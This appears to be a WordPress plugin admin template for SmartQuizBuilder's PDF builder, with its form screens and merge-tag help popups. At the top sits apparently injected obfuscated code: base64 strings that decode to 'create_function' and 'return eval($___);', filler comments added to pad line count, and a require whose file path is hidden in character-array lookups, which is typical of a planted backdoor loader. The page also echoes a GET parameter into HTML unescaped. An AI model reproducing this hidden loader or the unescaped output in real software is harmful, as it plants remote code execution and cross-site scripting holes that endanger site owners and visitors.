<?php

if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}

include_once ("sqb-soapapi.php");

require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];





$id = "";
$content = "";
$pdf_content_name = "";
$page_view = "portrait";

if(isset($_GET['id'])){
	$id = $_GET['id'];

	$pdf_data = SQB_PdfContent::loadById($id);

	if(isset($pdf_data) && !empty($pdf_data)){
		$pdf_content_name = $pdf_data->getName();
		$pdf_content = $pdf_data->getContent();
		$pdf_contents = unserialize($pdf_content);

		$other_options = $pdf_data->getOtherOptions();

		if(!empty($other_options)){
			$other_options_unserialize = unserialize($other_options);

			if(!empty($other_options_unserialize["page_view"])){
  				$page_view = $other_options_unserialize["page_view"];
  			}
		}
		
		$i = 1;
		foreach($pdf_contents as $pdf_content){
			$active_class = "";
			if($i == 1){
				$active_class = "active";
			}

			if($pdf_content['type'] == 'image'){
				$content .= '<div class="pdf-slider-box pdf-slide-img '.$active_class.'" style=" background-image: url('.$pdf_content['data'].'); "><input type="hidden" value="'.$pdf_content['data'].'" class="pdf-slide-hidden-image">
					</div>';
			}else if($pdf_content['type'] == 'text'){
				$content .= '<div class="pdf-slider-box pdf-slide-text '.$active_class.'"><textarea class="pdf-content-data" style="display:none;">'.stripslashes($pdf_content['data']).'</textarea></div>';
			}
			$i++;
		}
	}
}
?>
<input type="hidden" id="pdf_id" value="<?php echo $id; ?>">
<input type="hidden" id="get_home_url" value="<?php echo get_home_url(); ?>">

<div class="sqb-pdf-generator-main">
	<div class="sqb-pdf-generator-main-container <?php echo $page_view == 'landscape' ? 'pdf_landscape_view':''; ?>">
		<div class="sqb-ai-style-quiz-start-screen sqb-ai-style-screen sqb-ai-style-quiz-common-info sqb-ai-active-screen">
			<div class="pdf-content-wrapper">
				<img src="<?php echo get_home_url(); ?>/wp-content/plugins/smartquizbuilder/includes/admin/../../includes/images/pdf.png"> 
				<h2 class="sqb-ai-style-section-heading">Smart PDF Builder</h2>
				<p class="sqb-ai-style-section-content mb-1"> Enter the PDF name. Add the images/content. SQB will create the PDF for you!</p>
				<p class="sqb-ai-style-section-content">You can create a PDF for each quiz outcome here.</p>

				<div class="sqb-ai-style_form_input">
					<div class="sqb-ai-style_form_input_wrapper">
						<div class="gpt-field-main-wrapper sqb-ai-style-normal">
							<label class="control-label change-with-survey">What is the PDF title?</label>
							<input type="text" placeholder="Enter PDF name" id="pdf_content_name" class="sqb-ai-style-field-input" name="pdf_content_name" value="<?php echo $pdf_content_name; ?>">
							<div class="empty-name-error" style="display:none;">Please enter name</div>
						</div>
					</div>
				</div>


				<div class="sqb-ai-style_form_input">
					<div class="sqb-ai-style_form_input_wrapper">
						<div class="gpt-field-main-wrapper sqb-ai-style-normal">
							<label class="control-label change-with-survey">Select Type</label>
							<div class="quiz_right-content">
								<label for="page_view_option_portrait" class="chatgpt-ai-type-inner radio-btn--outer"><input type="radio" name="page_view_option" id="page_view_option_portrait" value="portrait" <?php echo $page_view == 'portrait' ? 'checked':''; ?> ><span>Portrait</span>
								</label>
								<label for="page_view_option_landscape" class="chatgpt-ai-type-inner radio-btn--outer"><input type="radio" name="page_view_option" id="page_view_option_landscape" value="landscape" <?php echo $page_view == 'landscape' ? 'checked':''; ?>> <span>Landscape</span>
								</label>
							</div>
						</div>
					</div>
				</div>
				<button class="sqb-new-btn pdf-back-btn">Back</button>
				<button class="sqb-new-btn pdf-next-btn" data-next="sqb-pdf-generator-screen">Next</button>
			</div>
		</div>

		<div id="sqb-pdf-generator-screen" class="sqb-ai-style-screen sqb-ai-style-quiz-common-info">
			
			<div class="pdf-slide-append-main">
				<div class="pdf-slide-box-create-box sqb-ai-active">
					<div class="sqb-ai-style-form-template-wrapper">
						<div class="sqb-ai-style-item-main-box">
							<div class="sqb-ai-style-item-inner">
								<div class="sqb-ai-style-item-text">
									<h2>Add an Image</h2>
									<p>Upload Image</p>
									<button class="sqb_add_image sqb-new-btn">Add an Image</button>
								</div>
							</div>
							<div class="sqb-ai-style-item-inner">
								<div class="sqb-ai-style-item-text">
									<h2>Add Content</h2>
									<p>Add Content to PDF</p>
									<button class=" sqb_add_content sqb-new-btn">Add Content</button>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>

			<div class="pdf-slide-sticky-bottom-page">
				<div class="pdf-slide-sticky-bottom-page-preview-box" id="sortable">
					<?php echo $content; ?>
					<div class="pdf-slider-box pdf-slide-img pdf-slider-box-btn">
						<input type="hidden" value="" class="pdf-slide-hidden-image">
						<button class="add-slide-btn"><i class="fa fa-plus"></i></button>
					</div>
				</div>
			</div>
			<div class="save-pdf-btn-outer">
				<div class="sqb-header-empty-box-space"></div>
				<div class="sqb-header-how-it-work">
					<div class="sqb-shortcode-heading"><span>How this works!</span> <div class="tool-tip custom-field-personadivze user-tags"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc rank_tag custom-field">
						<p>If you want to create a customized PDF for each outcome of your quiz and allow participants to download it, just create the PDF here.</p>
						<p>You'll be able to select this PDF in the SQB Quiz >> Outcome Screen and connect it to your outcome.</p>
						<p>You can create a unique PDF here for each outcome. Or use the same PDF for all outcomes. </p>
					</div> </div></div>
				</div>
				<div class="btn-right-side">
					<a href="javascript:void(0)" class="pdf-content-back sqb-new-btn"> Back </a>
					<a href="javascript:void(0)" class="pdf-content-save sqb-new-btn" onclick="sqb_save_pdf_content_data()"> Save </a>
					<a href="javascript:void(0)" class="pdf-content-save sqb-new-btn" onclick="sqb_save_pdf_content_data('next')"> Save and Next </a>
				</div>
			</div>
		</div>


		<div id="sqb-pdf-thankyou-screen" class="sqb-ai-style-screen sqb-ai-style-quiz-common-info sqb-ai-active-screen">
			<div class="pdf-content-wrapper">
				<img src="<?php echo get_home_url(); ?>/wp-content/plugins/smartquizbuilder/includes/admin/../../includes/images/pdf.png"> 
				<h2 class="sqb-ai-style-section-heading">Congrats your PDF is ready!</h2>
				
				<div class="preview-wrapper">
					<a class="sqb-goback-btn sqb-new-btn" href="javascript:void(0);">
						Go Back
					</a>
					<a class="sqb-preview-pdf sqb-new-btn" href="javascript:void(0);">
						Click to Preview
					</a>
					<a class="sqb-gotolist sqb-new-btn" href="<?php echo admin_url( 'admin.php?page=sqb_pdf_content' ); ?>">Go to list</a>
				</div>

				<p class="sqb-ai-style-section-content sqb-alert">
					<strong>Please note:</strong>
					This is just a preview.<br />
					The merge tags will not be replaced in the Preview but will be replaced when quiz takers download it.</p>
			</div>
		</div>

	</div>


	

</div>

<div class="pdf-slide-box-create-box-a4-size-wrapper  pdf-for-img" style="display: none;">
	<div class="pdf-slide-box-create-box-a4-size sqb-ai-active  pdf-screen-img">
		<div class="action-btn-wrapper">
			<button class="edit-img"><i class="fa fa-pencil" aria-hidden="true" title="Edit"></i></button>
			<button class="delete-img"><i class="fa fa-trash-o" aria-hidden="true" title="Delete"></i></button>
		</div>
		<div class="sqb-pdf-img">
			%%DYNAMIC_IMAGE%%
		</div>
	</div>
</div>

<div class="pdf-slide-box-create-box-a4-size-wrapper pdf-for-content" style="display: none;">
	<div class="pdf-slide-box-create-box-a4-size sqb-ai-active pdf-screen-content">
		<div class="sqb-pdf-content">
			<div class="action-btn-wrapper">
				<button class="delete-img"><i class="fa fa-trash-o" aria-hidden="true" title="Delete"></i></button>
			</div>
			<div class="pdf-content-page-name">
				<div class="d-flex align-items-center pdf_content-page-title ">
					<h3 class="section_heading"> Content</h3>
				</div>
				<div class="personalize_options pdf-personalize-btn sqb-pdf-individual-outer">
					<a class=" sqb-new-btn btn-pdf-ai-popup">Use AI for Content</a>
					<a class=" sqb-new-btn btn-pdf-avalible-tags-popup"> Personalize</a>
					<a class="sqb-pdf-builder-merge-tags show_question_merge_tags show_merge_tags1"> Individual Questions</a>
				               
                    
				</div>
				<div class="form-group row mb-4 ml-4">
				  	<div class="col-sm-10">
						
					   	<textarea class="pdf-content-area" id="pdf_content_data_%%UNIQUEID%%" style="height: 225px;">%%DYNAMIC_TEXTAREA%%</textarea> </div>
				</div>
				<div class="save-button"><button type="button" class="btn btn-info save-content-data sqb-new-btn">Save</button></div>
			</div>
		</div>
	</div>
</div>

<div class="Manage_Side_Popup personality_side_popup_options_wrapper pdf_individual_question_avalible_tags_popup_options_wrapper quiz-form-side-popup" id="pdf_individual_question_avalible_tags_popup_options_wrapper">
	<div class="Manage_Side_Popup-inner">
		<a href="#" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
		<h4 class="main-title">Individual Questions</h4>
		<div class="sqb-quiz-type-content-wrapper">
			<div class="sqb-quiz-type-content-row sqb-quiz-type-content-personality active">
				<div class="sqb-popup-shortcode-list">
					<p>Please use this format if you want to reference specific questions or user responses.</p>

					<div class="addtoeditor">
						<div class="sqb-shortcode-heading">This will show question 1 title.</div>
						<div class="sqb-shortcode-merge-tag-wrapper">
							<span class="shortcode_display" id="dynamic_copyable_text_question">%%QUESTION_1%%</span>
							<span data-id="dynamic_copyable_text_question" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
						</div>
					</div>

					<div class="addtoeditor">
						<div class="sqb-shortcode-heading">This will show user's answer to question #1.</div>
						<div class="sqb-shortcode-merge-tag-wrapper">
							<span class="shortcode_display" id="dynamic_copyable_text_selected_answer">%%QUESTION_1_SELECTED_ANSWERS%% </span>
							<span data-id="dynamic_copyable_text_selected_answer" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
						</div>
					</div>

					<p>You can do the same for any question. <br>
					Just replace the number "1" in the example above with any question number.</p>

					<p>You can use these tags in the PDF content as shown in the example below: </p>

					<p>When asked about %%QUESTION_1%%, here's what you said:<br>
					%%QUESTION_1_SELECTED_ANSWERS%%</p>

					<p>When asked about %%QUESTION_2%%, here's what you said:<br>
					%%QUESTION_2_SELECTED_ANSWERS%%</p>

				</div>
			</div>
		</div>
	</div>
</div>


<div class="Manage_Side_Popup personality_side_popup_options_wrapper pdf_avalible_tags_popup_options_wrapper quiz-form-side-popup active_Side_Popup1" id="pdf_avalible_tags_popup_options_wrapper">
	<div class="Manage_Side_Popup-inner">
		<a href="#" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
		<h4 class="main-title">Available Tags</h4>
		<div class="sqb-quiz-type-content-wrapper">
			<div class="sqb-quiz-type-content-row sqb-quiz-type-content-personality active">
				<div class="sqb-popup-shortcode-list">

				<div class="sqb-new-accordion-item">
					<div class="sqb-new-accordion-header">Common Tags (all quiz types)</div>
					<div class="sqb-new-accordion-content">
						<div class="addtoeditor">
							<div class="sqb-shortcode-heading">Quiz Title</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_title">%%QUIZ_TITLE%%</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_title" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading">Quiz Description</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_description">%%QUIZ_DESCRIPTION%%</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_description" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading">Quiz Type</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_type">%%QUIZ_TYPE%%</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_type" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading">Outcome</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_outcome">%%OUTCOME%%</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_outcome" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading">Outcome Description</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_outcome_description">%%OUTCOME_DESCRIPTION%%</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_outcome_description" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading">Name</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_name">%%NAME%%</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_name" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading">Email</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_email">%%EMAIL%%</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_email" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Answers</span>
								<div class="tool-tip custom-field-personadivze"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc custom-field" style="width:265px;right:-175px;">This will allow you to show questions and the selected answers from participants. For a scoring/assessment, it'll also show correct/incorrect answers.</div> </div>
							</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_answers">%%ANSWERS%%</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_answers" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Chart Heading</span>
							<div class="tool-tip custom-field-personadivze"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc custom-field" style="width:265px;right:-175px;">For e.g. %%TOTALUSERS%% user(s) participated in the %%QUIZ_NAME%% quiz. Here are the detailed results:</div> </div>
							</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_chart_heading">[CHART_HEADING]</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_chart_heading" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Outcome Spider Chart</span>
							<div class="tool-tip custom-field-personadivze"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc custom-field" style="width:265px;right:-175px;">It'll display cumulated results of ALL users that have taken this quiz in the form of a chart.</div> </div></div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_chart_outcome_spider_chart">[OUTCOME_SPIDER_CHART]</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_chart_outcome_spider_chart" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
							<div class="sqb-shorcode-box"><p class="sqb-ai-style-section-content  sqb-box-with-border">
								<strong>Please note:</strong>
								if you use the Chart Shortcode in the PDF, make sure to enable 'charts" in the Display Settings tab of your quiz.
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Outcome Bar Chart</span>
							<div class="tool-tip custom-field-personadivze"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc custom-field" style="width:265px;right:-175px;">It'll display cumulated results of ALL users that have taken this quiz in the form of a cart.</div> </div>
							</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_chart_outcome_bar_chart">[OUTCOME_BAR_CHART]</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_chart_outcome_bar_chart" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
							<div class="sqb-shorcode-box"><p class="sqb-ai-style-section-content  sqb-box-with-border">
								<strong>Please note:</strong>
								if you use the Chart Shortcode in the PDF, make sure to enable 'charts" in the Display Settings tab of your quiz.
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Outcome Pie Chart</span>
							<div class="tool-tip custom-field-personadivze"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc custom-field" style="width:265px;right:-175px;">It'll display cumulated results of ALL users that have taken this quiz in the form of a chart.</div> </div></div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_chart_outcome_pie_chart">[OUTCOME_PIE_CHART]</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_chart_outcome_pie_chart" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
							<div class="sqb-shorcode-box"><p class="sqb-ai-style-section-content  sqb-box-with-border">
								<strong>Please note:</strong>
								if you use the Chart Shortcode in the PDF, make sure to enable 'charts" in the Display Settings tab of your quiz.
							</div>
						</div>

						

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Show Outcome Title</span> <div class="tool-tip custom-field-personadivze user-tags"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc rank_tag custom-field" style="width:265px;right:-48px;">It'll show users the outcome title of the 1st highest ranked outcomes for them. You can do the same for rank 2,3 etc.</div> </div></div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_show_outcome_title">[ShowOutcomeTitle Rank="1"]</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_show_outcome_title" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Show Outcome Description</span> <div class="tool-tip custom-field-personadivze user-tags"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc rank_tag custom-field" style="width:265px;right:-48px;">It'll show users the outcome description of the 1st highest ranked outcomes for them. You can do the same for rank 2,3 etc.</div> </div></div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_show_outcome_description">[ShowOutcomeDesc Rank="1"]</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_show_outcome_description" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Custom Field</span> <div class="tool-tip custom-field-personadivze"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc custom-field" style="width:265px;right:-175px;">Say the name of the custom field is "tax_id". Then you can use this merge tag to send the tax_id value in the email %%custom_tax_id%%</div> </div></div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_show_custom_field">%%custom_[ENTER CUSTOM FIELD NAME]%%</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_show_custom_field" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Show All User Tags</span> <div class="tool-tip custom-field-personadivze user-tags"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc custom-field" style="width:265px;right:-100px;">Display tag description for all tags (answer + outcome) assigned to the quiz taker in the frontend based on their answers to this quiz.<br>You can setup tag description in SQB &gt;&gt; Settings page &gt;&gt; Quiz Settings &gt;&gt; <a href="../wp-admin/admin.php?page=sqb_settings&amp;inner_tab=tags_tab" target="_blank">Tag Content</a> tab.</div> </div></div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_show_all_user_tag">[SHOWALLUSERTAGS]</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_show_all_user_tag" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Show Tag Content</span> <div class="tool-tip custom-field-personadivze user-tags-name"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc custom-field" style="width:265px;right:-195px;">Display the tag description for the selected tag. It'll only be displayed if the quiz taker gets this tag.  You can setup tag description in SQB &gt;&gt; Settings page &gt;&gt; Quiz Settings &gt;&gt; <a href="../wp-admin/admin.php?page=sqb_settings&amp;inner_tab=tags_tab" target="_blank">Tag Content</a> tab.</div> </div></div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_show_tag_content">[SHOWTAGCONTENT Name="Tag Name"]</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_show_tag_content" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>
					</div>
				</div>


				<div class="sqb-new-accordion-item">
					<div class="sqb-new-accordion-header">Scoring / Assessment Quiz</div>
					<div class="sqb-new-accordion-content">
						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Total Questions</span>
							<div class="tool-tip custom-field-personadivze user-tags"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc rank_tag custom-field" style="width:265px;right:-48px;">Display total questions.</div> </div>
							</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_total_ques">%%TOTALQUESTIONS%%	</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_total_ques" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Correct Answers</span>
							<div class="tool-tip custom-field-personadivze user-tags"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc rank_tag custom-field" style="width:265px;right:-48px;">Display all correct answers.</div> </div>
							</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_correcans">%%CORRECTANSWERS%%</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_correcans" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>
						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Incorrect Answers</span>
							<div class="tool-tip custom-field-personadivze user-tags"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc rank_tag custom-field" style="width:265px;right:-48px;">Calculate incorrect answer as  "total Questions - correct answers".</div> </div>
							</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_incorrecans">%%INCORRECTANSWERS%%</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_incorrecans" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>
						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Score</span>
							<div class="tool-tip custom-field-personadivze user-tags"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc rank_tag custom-field" style="width:265px;right:-48px;">Calculate score as  ( correct answers / total questions ) * 100.</div> </div>
							</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_score">%%SCORE%%</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_score" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>
						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Show Category Total</span>
							<div class="tool-tip custom-field-personadivze"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc custom-field" style="width:265px;right:-175px;">Display total score or total correct answers broken down by category on the final outcome screen.</div> </div>
							</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_show_category_total">%%SHOW_CATEGORY_TOTAL%%</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_show_category_total" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Category Total Percent</span>
							<div class="tool-tip custom-field-personadivze"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc custom-field" style="width:265px;right:-175px;">Display total score (in percentage) broken down by categories on the final outcome screen.</div> </div>
							</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_show_category_total_percent">%%CATEGORY_TOTAL_PERCENT%%</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_show_category_total_percent" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Category Total Number</span>
							<div class="tool-tip custom-field-personadivze"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc custom-field" style="width:265px;right:-175px;">Display total score (in number) broken down by categories on the final outcome screen.</div> </div>
							</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_show_category_total_number">%%CATEGORY_TOTAL_NUMBER%%</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_show_category_total_number" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading">
								<span>Category Rank Shortcode</span>
								<div class="tool-tip custom-field-personadivze user-tags"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc rank_tag custom-field" style="width:265px;right:-48px;">This will allow SQB to display scores in different categories based on the specified order and colors for high to low scores. The category description for each category can be defined in SQB >> settings >> advanced quiz settings >> Category Tab.</div> </div>
							</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_show_category_rank">[CategoryRank columns=1 order=lowtohigh high="green" medium="yellow" low="red" HighRange="80-100" MediumRange="50-80" LowRange="0-50" limitto="5"]</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_show_category_rank" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						
						<div class="addtoeditor">
